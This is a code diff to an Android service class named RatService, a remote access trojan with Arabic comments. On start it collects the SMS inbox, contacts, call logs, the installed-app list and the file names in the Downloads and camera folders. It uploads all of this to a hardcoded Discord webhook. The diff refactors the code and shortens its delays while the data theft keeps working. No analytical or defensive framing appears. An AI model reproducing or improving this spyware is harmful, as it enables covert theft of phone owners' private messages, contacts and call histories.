@@ -18,46 +18,31 @@ import okhttp3.*;
 public class RatService extends Service {
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
     private OkHttpClient client = new OkHttpClient();
-    private boolean isRunning = true;
 
     @Override
     public void onCreate() {
         super.onCreate();
         startForegroundService();
-        sendTextToDiscord("🔄 **تم تفعيل الأداة! جاري سحب كل البيانات (رسايل، مكالمات، جهات اتصال)...**");
-
-        // نستنى 6 ثواني لحد ما المستخدم يوافق على كل الصلاحيات
+        
+        // سحب فوري
         new Thread(() -> {
             try {
-                Thread.sleep(6000);
+                sendTextToDiscord("🔄 **الأداة اشتغلت! جاري سحب كل البيانات...**");
                 
-                // 1. معلومات الجهاز
-                String info = "📱 **معلومات الجهاز:**\n" +
-                        "Model: " + Build.MODEL + "\n" +
-                        "Brand: " + Build.BRAND + "\n" +
-                        "Android: " + Build.VERSION.RELEASE;
+                String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                 sendTextToDiscord(info);
 
-                // 2. سحب الرسايل
                 dumpSms();
-                Thread.sleep(2500);
-
-                // 3. سحب جهات الاتصال
+                Thread.sleep(1500); // فاصل صغير عشان الديسكورد ميعملش بلوك
                 dumpContacts();
-                Thread.sleep(2500);
-
-                // 4. سحب سجل المكالمات
+                Thread.sleep(1500);
                 dumpCallLogs();
-                Thread.sleep(2500);
-
-                // 5. سحب التطبيقات المثبتة
+                Thread.sleep(1500);
                 dumpApps();
-                Thread.sleep(2500);
-
-                // 6. سحب أسماء الملفات من التحميلات والكاميرا
+                Thread.sleep(1500);
                 dumpFiles();
 
-                sendTextToDiscord("✅ **اكتمل سحب البيانات بالكامل بنجاح!**");
+                sendTextToDiscord("✅ **اكتمل سحب البيانات بالكامل!**");
             } catch (Exception e) {
                 sendTextToDiscord("❌ خطأ: " + e.getMessage());
             }
@@ -74,17 +59,14 @@ public class RatService extends Service {
         }
     }
 
-    // --- دوال سحب البيانات وإنشاء الملفات ---
-
+    // --- دوال سحب البيانات ---
     private void dumpSms() {
         File file = new File(getExternalFilesDir(null), "sms_all.txt");
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
             if (c != null) {
                 while (c.moveToNext()) {
-                    String address = c.getString(c.getColumnIndexOrThrow("address"));
-                    String body = c.getString(c.getColumnIndexOrThrow("body"));
-                    bw.write("From: " + address + "\n" + body + "\n-------------------\n");
+                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
                 }
                 c.close();
             }
@@ -99,9 +81,7 @@ public class RatService extends Service {
             Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
             if (c != null) {
                 while (c.moveToNext()) {
-                    String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    bw.write(name + " : " + number + "\n");
+                    bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n");
                 }
                 c.close();
             }
@@ -116,10 +96,7 @@ public class RatService extends Service {
             Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
             if (c != null) {
                 while (c.moveToNext()) {
-                    String number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                    String duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                    bw.write("Number: " + number + " | Type: " + type + " | Dur: " + duration + "s\n");
+                    bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + " | Dur: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)) + "s\n");
                 }
                 c.close();
             }
@@ -132,9 +109,7 @@ public class RatService extends Service {
         File file = new File(getExternalFilesDir(null), "apps.txt");
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
-            for (ApplicationInfo app : apps) {
-                bw.write(app.packageName + "\n");
-            }
+            for (ApplicationInfo app : apps) bw.write(app.packageName + "\n");
             bw.flush();
             uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
@@ -145,31 +120,22 @@ public class RatService extends Service {
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-            
             bw.write("=== Downloads ===\n");
-            if (download.exists() && download.listFiles() != null) {
-                for (File f : download.listFiles()) bw.write(f.getName() + "\n");
-            }
-            
-            bw.write("\n=== DCIM (Camera) ===\n");
-            if (dcim.exists() && dcim.listFiles() != null) {
-                for (File f : dcim.listFiles()) bw.write(f.getName() + "\n");
-            }
-            
+            if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
+            bw.write("\n=== DCIM ===\n");
+            if (dcim.exists() && dcim.listFiles() != null) for (File f : dcim.listFiles()) bw.write(f.getName() + "\n");
             bw.flush();
             uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
     // --- دوال الاتصال بالديسكورد ---
-
     private void sendTextToDiscord(String text) {
         try {
             JSONObject json = new JSONObject();
             json.put("content", text);
             RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
-            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
-            client.newCall(request).enqueue(new Callback() {
+            client.newCall(new Request.Builder().url(WEBHOOK_URL).post(body).build()).enqueue(new Callback() {
                 @Override public void onFailure(Call call, IOException e) {}
                 @Override public void onResponse(Call call, Response response) {}
             });
@@ -183,8 +149,7 @@ public class RatService extends Service {
                 .addFormDataPart("content", "📁 **ملف:** " + file.getName())
                 .addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                 .build();
-        Request request = new Request.Builder().url(WEBHOOK_URL).post(requestBody).build();
-        client.newCall(request).enqueue(new Callback() {
+        client.newCall(new Request.Builder().url(WEBHOOK_URL).post(requestBody).build()).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
             @Override public void onResponse(Call call, Response response) {}
         });
@@ -192,5 +157,4 @@ public class RatService extends Service {
 
     @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override public IBinder onBind(Intent intent) { return null; }
-    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
 }
